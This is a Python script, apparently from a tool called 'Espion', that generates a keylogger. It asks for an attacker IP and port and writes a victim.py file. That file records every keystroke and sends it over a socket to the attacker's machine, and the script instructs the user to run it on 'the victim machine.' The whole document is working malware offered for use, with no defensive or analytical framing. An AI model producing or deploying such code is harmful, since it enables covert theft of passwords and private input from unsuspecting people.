import sys
import socket
import os
if('2' in sys.version[0:1]):
    title = open("title.txt", "r")
    print(title.read())
    title.close()
    print("\n==================== THE GENERATOR PROGRAM ===========================")
    hostIP = raw_input("\nLHOST (%s's IP): "%socket.gethostname())
    port = 22
    while(True):
        try:
            port = input("PORT: ")
        except Exception:
            print("\nIncorrect format for a port number.\n")
        else:
            if(isinstance(port, int)==False):
                print("\nIncorrect format for a port number.\n")
            else:
                victim_file = open("victim.py", "w")
                victim_file.write('''import socket\nfrom sys import *\nimport keyboard\nwhile(True):\n    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    clientSocket.connect(("'''+hostIP+'''",'''+str(abs(port))+'''))\n    clientSocket.send((keyboard.read_key()).encode())''')
                victim_file.close()
                print("\nEspion has written a python file to %s titled %s. Run this file on the victim machine.\n"%(os.getcwd(), "victim.py"))
                break
elif('3' in sys.version[0:1]):
    title = open("title.txt", "r")
    print(title.read())
    title.close()
    print("\n==================== THE GENERATOR PROGRAM ===========================")
    hostIP = str(input("\nLHOST (%s's IP): "%socket.gethostname()))
    port = 22
    while(True):
        try:
            port = int(input("PORT: "))
        except Exception:
            print("\nIncorrect format for a port number.\n")
        else:
            if(isinstance(port, int)==False):
                print("\nIncorrect format for a port number.\n")
            else:
                victim_file = open("victim.py", "w")
                victim_file.write('''import socket\nfrom sys import *\nimport keyboard\nwhile(True):\n    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    clientSocket.connect(("'''+hostIP+'''",'''+str(abs(port))+'''))\n    clientSocket.send((keyboard.read_key()).encode())''')
                victim_file.close()
                print("\nEspion has written a python file to %s titled %s. Run this file on the victim machine.\n"%(os.getcwd(), "victim.py"))
                break